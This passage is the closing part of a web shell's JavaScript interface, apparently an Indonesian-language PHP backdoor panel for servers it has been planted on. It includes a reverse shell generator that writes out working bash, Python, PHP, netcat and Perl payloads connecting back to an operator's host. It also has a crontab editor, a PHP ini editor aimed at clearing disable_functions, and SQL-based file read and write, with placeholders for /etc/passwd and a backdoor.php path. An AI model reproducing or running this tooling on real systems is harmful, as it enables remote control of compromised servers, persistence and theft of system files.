            if (dismissEdit) return;

            if (new_crontab_content !== undefined) {
                const r3s_edit = await s3nd_r3qu3st('edit_crontab', { content: new_crontab_content });
                Swal.fire(r3s_edit.status === 'success' ? {
                    title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                    text: r3s_edit.m3ss4g3,
                    icon: 'success',
                    showConfirmButton: true
                } : {
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: r3s_edit.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                });
            }
        }
    }

    async function sh0w_reverse_shell_gen_d1al0g() {
        const { value: formValues, dismiss } = await Swal.fire({
            title: '<i class="material-icons-outlined">call_received</i> Reverse Shell Payload Generator',
            html:
                `<input id="swal-lhost" class="swal2-input" placeholder="LHOST (Your IP/Domain)" value="${window.location.hostname}">` +
                `<input id="swal-lport" class="swal2-input" placeholder="LPORT (Your Listening Port)" value="4444">` +
                `<select id="swal-payload-type" class="swal2-input">
                    <option value="bash">Bash</option>
                    <option value="python">Python</option>
                    <option value="php">PHP</option>
                    <option value="netcat">Netcat (nc)</option>
                    <option value="perl">Perl</option>
                </select>`,
            focusConfirm: false,
            showCancelButton: true,
            confirmButtonText: 'Generate Payload',
            cancelButtonText: 'Batal',
            preConfirm: () => {
                const lhost = Swal.getPopup().querySelector('#swal-lhost').value;
                const lport = Swal.getPopup().querySelector('#swal-lport').value;
                const payload_type = Swal.getPopup().querySelector('#swal-payload-type').value;
                if (!lhost || !lport) {
                    Swal.showValidationMessage(`LHOST dan LPORT tidak boleh kosong!`);
                    return false;
                }
                return { lhost, lport, payload_type };
            }
        });
        if (dismiss) return;

        if (formValues) {
            const { lhost, lport, payload_type } = formValues;
            let payload = '';

            switch (payload_type) {
                case 'bash':
                    payload = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
                    break;
                case 'python':
                    payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
                    break;
                case 'php':
                    payload = `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                    break;
                case 'netcat':
                    payload = `nc -e /bin/sh ${lhost} ${lport}`;
                    break;
                case 'perl':
                    payload = `perl -MIO -e '$i="\\\\\\"${lhost}\\\\\\\"";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                    break;
            }

            Swal.fire({
                title: '<i class="material-icons-outlined">code</i> Reverse Shell Payload',
                html: `<textarea readonly class="swal2-textarea" style="height: 150px;">${htmlentities(payload)}</textarea><br><small style="color:#888;">Salin payload ini dan jalankan di terminal server Anda. Pastikan listener (misal: nc -lvnp ${lport}) sudah aktif di mesin Anda.</small>`,
                icon: 'info',
                width: '90vw',
                showConfirmButton: true,
                confirmButtonText: 'Copy Payload',
                didOpen: () => {
                    const textArea = Swal.getPopup().querySelector('textarea');
                    textArea.select();
                },
                preConfirm: () => {
                    const textArea = Swal.getPopup().querySelector('textarea');
                    textArea.select();
                    document.execCommand('copy');
                    Swal.showValidationMessage('Payload disalin ke clipboard!');
                    return true;
                }
            });
        }
    }

    async function sh0w_php_ini_editor_d1al0g() {
        const { value: formValues, dismiss } = await Swal.fire({
            title: '<i class="material-icons-outlined">tune</i> PHP Ini Editor (Runtime)',
            html:
                `<input id="swal-ini-setting" class="swal2-input" placeholder="Nama setting (misal: disable_functions)">` +
                `<input id="swal-ini-value" class="swal2-input" placeholder="Nilai (misal: 'none' atau '0')">`,
            focusConfirm: false,
            showCancelButton: true,
            confirmButtonText: 'Set',
            cancelButtonText: 'Batal',
            preConfirm: () => {
                const setting = Swal.getPopup().querySelector('#swal-ini-setting').value;
                const value = Swal.getPopup().querySelector('#swal-ini-value').value;
                if (!setting) {
                    Swal.showValidationMessage(`Nama setting tidak boleh kosong!`);
                    return false;
                }
                return { setting, value };
            }
        });
        if (dismiss) return;

        if (formValues) {
            const r3s = await s3nd_r3qu3st('set_php_ini', formValues);
            Swal.fire(r3s.status === 'success' ? {
                title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                text: r3s.m3ss4g3,
                icon: 'success',
                showConfirmButton: true
            } : {
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            });
        }
    }

    async function sh0w_db_export_import_d1al0g() {
        const { value: import_export_choice, dismiss: dismissIE } = await Swal.fire({
            title: '<i class="material-icons-outlined">import_export</i> Import/Export Database',
            input: 'radio',
            inputOptions: {
                'export': 'Export Database/Table',
                'import': 'Import SQL File'
            },
            inputValue: 'export',
            showCancelButton: true,
            confirmButtonText: 'Next',
            cancelButtonText: 'Batal'
        });
        if (dismissIE) return;

        if (import_export_choice === 'export') {
            const { value: table_name, dismiss: dismissTableName } = await Swal.fire({
                title: '<i class="material-icons-outlined">cloud_download</i> Export Table',
                input: 'text',
                inputPlaceholder: 'Nama tabel (kosong untuk seluruh DB)',
                showCancelButton: true,
                confirmButtonText: 'Export',
                cancelButtonText: 'Batal'
            });
            if (dismissTableName) return;
            
            Swal.fire({
                title: '<i class="fas fa-info-circle mr-2"></i> Fitur Export',
                text: 'Fitur ekspor database/tabel yang sebenarnya memerlukan akses ke perintah `mysqldump` di server, yang mungkin tidak tersedia atau memerlukan hak istimewa. Untuk demo, ini akan mencoba mengambil data menggunakan SELECT.',
                icon: 'info',
                showConfirmButton: true
            });
            const query_for_export = table_name ? `SELECT * FROM ${table_name}` : `SHOW TABLES`; 
            const r3s_export = await s3nd_r3qu3st('db_m4n4g3r_query', { ...Swal.getPopup()._dbCreds, query: query_for_export }); 
            
            if(r3s_export.status === 'success' && r3s_export.queryResult && r3s_export.queryResult.length > 0) {
                let export_data_str = `/* Data from ${table_name || 'selected tables'} */\n\n`;
                r3s_export.queryResult.forEach(row => {
                    export_data_str += `INSERT INTO \`${table_name || 'your_table'}\` VALUES ('${Object.values(row).join("','")}');\n`; 
                });

                const { value: copy_confirm, dismiss: dismissDownload } = await Swal.fire({
                    title: '<i class="material-icons-outlined">file_download</i> Konten SQL Export',
                    html: `<textarea readonly class="swal2-textarea" style="height: 200px;">${htmlentities(export_data_str)}</textarea><br><small style="color:#888;">Salin konten ini. Ekspor penuh memerlukan hak akses server.</small>`,
                    showCancelButton: true,
                    confirmButtonText: 'Salin ke Clipboard',
                    cancelButtonText: 'Batal'
                });

                if (copy_confirm) {
                     // Copy to clipboard
                    const textArea = Swal.getPopup().querySelector('textarea');
                    textArea.select();
                    document.execCommand('copy');
                    Swal.fire({
                        title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                        text: 'Konten SQL disalin ke clipboard!',
                        icon: 'success',
                        showConfirmButton: true
                    });
                }
            } else {
                Swal.fire({
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Export Gagal!',
                    text: r3s_export.m3ss4g3 || 'Tidak dapat mengekspor data atau tidak ada hasil.',
                    icon: 'error',
                    showConfirmButton: true
                });
            }

        } else if (import_export_choice === 'import') {
            const { value: sql_content, dismiss: dismissSqlContent } = await Swal.fire({
                title: '<i class="material-icons-outlined">cloud_upload</i> Import SQL',
                input: 'textarea',
                inputPlaceholder: 'Tempelkan konten SQL di sini...',
                showCancelButton: true,
                confirmButtonText: 'Import',
                cancelButtonText: 'Batal',
                width: '90vw'
            });
            if (dismissSqlContent) return;

            if (sql_content) {
                const r3s = await s3nd_r3qu3st('db_m4n4g3r_query', { ...Swal.getPopup()._dbCreds, query: sql_content });
                Swal.fire(r3s.status === 'success' ? {
                    title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                    text: 'Import SQL berhasil: ' + r3s.m3ss4g3,
                    icon: 'success',
                    showConfirmButton: true
                } : {
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: 'Import SQL gagal: ' + r3s.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                });
            }
        }
    }

    async function sh0w_db_schema_viewer_d1al0g() {
        const { value: table_name, dismiss: dismissTableName } = await Swal.fire({
            title: '<i class="material-icons-outlined">view_list</i> Lihat Skema Tabel',
            input: 'text',
            inputPlaceholder: 'Nama Tabel (misal: users)',
            showCancelButton: true,
            confirmButtonText: 'Lihat Skema',
            cancelButtonText: 'Batal',
            inputValidator: (value) => {
                if (!value) return 'Nama tabel tidak boleh kosong!';
            }
        });
        if (dismissTableName) return;

        if (table_name) {
            const query = `SELECT COLUMN_NAME, DATA_TYPE, COLUMN_TYPE, IS_NULLABLE, COLUMN_KEY, COLUMN_DEFAULT, EXTRA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '${Swal.getPopup()._dbCreds.db}' AND TABLE_NAME = '${table_name}'`;
            const r3s = await s3nd_r3qu3st('db_m4n4g3r_query', { ...Swal.getPopup()._dbCreds, query: query });
            
            if (r3s.status === 'success') {
                let schema_html = '';
                if (r3s.queryResult && r3s.queryResult.length > 0) {
                    schema_html += '<table style="width:100%; border-collapse:collapse; margin: 15px 0; background:white; box-shadow:0 1px 3px rgba(0,0,0,0.05); border-radius:6px; overflow:hidden;">';
                    schema_html += '<thead><tr style="background:#f4f6f8; color:#333;">';
                    r3s.queryHeaders.forEach(header => {
                        schema_html += `<th style="padding:10px 12px; border:1px solid #eee; text-align:left;">${htmlentities(header)}</th>`;
                    });
                    schema_html += '</tr></thead><tbody>';
                    r3s.queryResult.forEach(row => {
                        schema_html += '<tr style="background:white;">';
                        r3s.queryHeaders.forEach(header => {
                            schema_html += `<td style="padding:10px 12px; border:1px solid #eee; text-align:left;">${htmlentities(row[header])}</td>`;
                        });
                        schema_html += '</tr>';
                    });
                    schema_html += '</tbody></table>';
                } else {
                    schema_html = `<p style="color:#888;">Skema tabel tidak ditemukan atau tabel kosong.</p>`;
                }
                Swal.fire({
                    title: `<i class="material-icons-outlined">view_list</i> Skema Tabel: ${table_name}`,
                    html: `<div class="swal2-html-container">${schema_html}</div>`,
                    icon: 'info',
                    width: '90vw',
                    showConfirmButton: true
                });
            } else {
                Swal.fire({
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: r3s.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                });
            }
        }
    }

    async function sh0w_db_file_rw_d1al0g() {
        const { value: rw_option, dismiss: dismissRW } = await Swal.fire({
            title: '<i class="material-icons-outlined">swap_horiz</i> File Read/Write via SQL',
            input: 'radio',
            inputOptions: {
                'read_file': 'Baca File dari Server',
                'write_file': 'Tulis File ke Server'
            },
            inputValue: 'read_file',
            showCancelButton: true,
            confirmButtonText: 'Next',
            cancelButtonText: 'Batal'
        });
        if (dismissRW) return;

        if (rw_option === 'read_file') {
            const { value: file_path, dismiss: dismissPath } = await Swal.fire({
                title: '<i class="material-icons-outlined">file_open</i> Baca File via SQL',
                input: 'text',
                inputPlaceholder: 'Path file di server (misal: /etc/passwd)',
                showCancelButton: true,
                confirmButtonText: 'Baca',
                cancelButtonText: 'Batal'
            });
            if (dismissPath) return;

            if (file_path) {
                const query = `SELECT LOAD_FILE('${file_path.replace(/'/g, "''")}') AS file_content`;
                const r3s = await s3nd_r3qu3st('db_m4n4g3r_query', { ...Swal.getPopup()._dbCreds, query: query });
                if (r3s.status === 'success' && r3s.queryResult && r3s.queryResult.length > 0) {
                    const file_content = r3s.queryResult[0].file_content;
                    Swal.fire({
                        title: `<i class="material-icons-outlined">visibility</i> Konten File: ${file_path}`,
                        html: `<pre class="swal2-html-container">${htmlentities(file_content)}</pre>`,
                        icon: 'info',
                        width: '90vw',
                        showConfirmButton: true
                    });
                } else {
                    Swal.fire({
                        title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal Membaca File!',
                        text: r3s.m3ss4g3 || 'Tidak dapat membaca file atau hak istimewa FILE tidak tersedia.',
                        icon: 'error',
                        showConfirmButton: true
                    });
                }
            }
        } else if (rw_option === 'write_file') {
            const { value: file_path, dismiss: dismissPath } = await Swal.fire({
                title: '<i class="material-icons-outlined">save</i> Tulis File via SQL',
                input: 'text',
                inputPlaceholder: 'Path file untuk ditulis (misal: /var/www/html/backdoor.php)',
                showCancelButton: true,
                confirmButtonText: 'Next',
                cancelButtonText: 'Batal'
            });
            if (dismissPath) return;

            if (file_path) {
                const { value: file_content, dismiss: dismissContent } = await Swal.fire({
                    title: '<i class="material-icons-outlined">edit</i> Konten File untuk Ditulis',
                    input: 'textarea',
                    inputPlaceholder: 'Masukkan konten file...',
                    showCancelButton: true,
                    confirmButtonText: 'Tulis',
                    cancelButtonText: 'Batal'
                });
                if (dismissContent) return;

                if (file_content !== undefined) {
                    const query = `SELECT '${file_content.replace(/'/g, "''")}' INTO OUTFILE '${file_path.replace(/'/g, "''")}'`;
                    const r3s = await s3nd_r3qu3st('db_m4n4g3r_query', { ...Swal.getPopup()._dbCreds, query: query });
                    Swal.fire(r3s.status === 'success' ? {
                        title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                        text: `File berhasil ditulis ke: ${file_path}`,
                        icon: 'success',
                        showConfirmButton: true
                    } : {
                        title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                        text: r3s.m3ss4g3 || 'Gagal menulis file atau hak istimewa FILE tidak tersedia.',
                        icon: 'error',
                        showConfirmButton: true
                    });
                }
            }
        }
    }

    function htmlentities(str) {
        return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    document.querySelectorAll('table th').forEach(h3ad => {
        h3ad.addEventListener('click', () => {
            const s0rt_by = h3ad.dataset.sort;
            s0rt_t4bl3(s0rt_by);
        });
    });

    let s0rt_d1r3ct10n = {};
    function s0rt_t4bl3(c0lumn) {
        const t4bl3_b0dy = document.getElementById('f1l3_l1st_b0dy');
        const r0ws = Array.from(t4bl3_b0dy.querySelectorAll('tr'));

        const d1r = s0rt_d1r3ct10n[c0lumn] === 'asc' ? 'desc' : 'asc';
        s0rt_d1r3ct10n[c0lumn] = d1r;

        const s0rt3d_r0ws = r0ws.sort((r0w_a, r0w_b) => {
            const n4m3_a = r0w_a.cells[1].innerText.trim();
            const n4m3_b = r0w_b.cells[1].innerText.trim();

            if (n4m3_a === '..') return -1;
            if (n4m3_b === '..') return 1;

            let c0mp4r3_v4l_a, c0mp4r3_v4l_b;

            switch (c0lumn) {
                case 'name':
                    c0mp4r3_v4l_a = n4m3_a;
                    c0mp4r3_v4l_b = n4m3_b;
                    return d1r === 'asc' ? c0mp4r3_v4l_a.localeCompare(c0mp4r3_v4l_b) : c0mp4r3_v4l_b.localeCompare(c0mp4r3_v4l_a);
                case 'type':
                    c0mp4r3_v4l_a = r0w_a.cells[2].innerText;
                    c0mp4r3_v4l_b = r0w_b.cells[2].innerText;
                    break;
                case 'size':
                    c0mp4r3_v4l_a = p4rs3_s1z3_str(r0w_a.cells[3].innerText);
                    c0mp4r3_v4l_b = p4rs3_s1z3_str(r0w_b.cells[3].innerText);
                    break;
                case 'permission':
                    c0mp4r3_v4l_a = r0w_a.cells[4].innerText;
                    c0mp4r3_v4l_b = r0w_b.cells[4].innerText;
                    break;
                case 'date':
                    c0mp4r3_v4l_a = new Date(r0w_a.cells[5].innerText).getTime();
                    c0mp4r3_v4l_b = new Date(r0w_b.cells[5].innerText).getTime();
                    break;
                default:
                    return 0;
            }

            if (c0mp4r3_v4l_a < c0mp4r3_v4l_b) return d1r === 'asc' ? -1 : 1;
            if (c0mp4r3_v4l_a > c0mp4r3_v4l_b) return d1r === 'asc' ? 1 : -1;
            return 0;
        });

        t4bl3_b0dy.innerHTML = '';
        s0rt3d_r0ws.forEach(r0w => t4bl3_b0dy.appendChild(r0w));
    }

    function p4rs3_s1z3_str(s1z3_str) {
        if (s1z3_str === '-') return -1;
        const un1ts = { 'B': 1, 'KB': 1024, 'MB': 1024 * 1024, 'GB': 1024 * 1024 * 1024, 'TB': 1024 * 1024 * 1024 * 1024 };
        const m4tch = s1z3_str.match(/^(\d+(\.\d+)?)\s*([KMGT]?B)$/i);
        if (!m4tch) return 0;
        const v4lue = parseFloat(m4tch[1]);
        const un1t = m4tch[3].toUpperCase();
        return v4lue * (un1ts[un1t] || 1);
    }

    selectAllCheckbox.addEventListener('change', (event) => {
        document.querySelectorAll('.item-checkbox').forEach(cb => {
            if (cb.closest('tr').querySelector('td:nth-child(2) a')?.innerText !== '..') {
                cb.checked = event.target.checked;
            }
        });
        updateSelectedItemsCount();
    });

    document.addEventListener('change', (event) => {
        if (event.target.classList.contains('item-checkbox')) {
            updateSelectedItemsCount();
        }
    });

    function updateSelectedItemsCount() {
        const currentItemCheckboxes = document.querySelectorAll('.item-checkbox');
        const selectedCount = Array.from(currentItemCheckboxes).filter(cb => cb.checked).length;
        selectedItemsCountSpan.innerText = `${selectedCount} item selected`;
        if (selectedCount > 0) {
            massDeleteBar.classList.add('show');
        } else {
            massDeleteBar.classList.remove('show');
        }
        selectAllCheckbox.checked = selectedCount > 0 && selectedCount === Array.from(currentItemCheckboxes).filter(cb => cb.closest('tr').querySelector('td:nth-child(2) a')?.innerText !== '..').length;
    }
</script>
</body>
</html>
